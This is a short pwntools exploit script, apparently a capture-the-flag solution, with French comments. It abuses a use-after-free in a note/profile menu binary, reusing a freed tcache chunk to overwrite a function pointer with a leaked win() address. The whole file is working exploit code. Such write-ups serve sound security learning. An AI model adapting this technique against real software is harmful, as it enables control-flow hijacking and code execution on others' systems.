#!/usr/bin/env python3
from pathlib import Path

from pwn import *


def main():
    context.log_level = os.getenv("LOG", "info")
    here = Path(__file__).resolve().parent
    context.binary = elf = ELF(str(here / "challenge"), checksec=False)

    host = os.getenv("HOST")
    port = int(os.getenv("PORT", "1337"))
    io = remote(host, port) if host else process(elf.path, cwd=str(here))

    io.recvuntil(b"win @ ")
    win = int(io.recvline().strip(), 16)
    log.info("win @ %#x", win)

    def choose(n: int):
        io.sendlineafter(b"> ", str(n).encode())

    # 1) create_note -> alloue un chunk taille ~0x60
    choose(1)
    io.recvuntil(b"raw) :\n")
    io.send(b"A" * 0x50)

    # 2) delete_note -> free(note) mais g_note reste pointe sur l'ancien chunk
    choose(2)

    # 3) create_profile -> malloc même taille, récupère le chunk libéré via tcache
    choose(5)
    io.recvuntil(b"raw) :\n")
    io.send(b"B" * 0x50)

    # 4) edit_note (UAF) -> on overwrite le début du chunk, donc g_prof->action
    choose(3)
    io.recvuntil(b"raw) :\n")
    # edit_note écrit sizeof(Note) bytes à partir du début du chunk :
    # on place donc win dans le premier champ (pointeur de fonction).
    payload = p64(win) + b"C" * (0x58 - 8)
    io.send(payload)

    # 5) show_profile -> appelle action() -> win()
    choose(6)
    io.interactive()


if __name__ == "__main__":
    main()
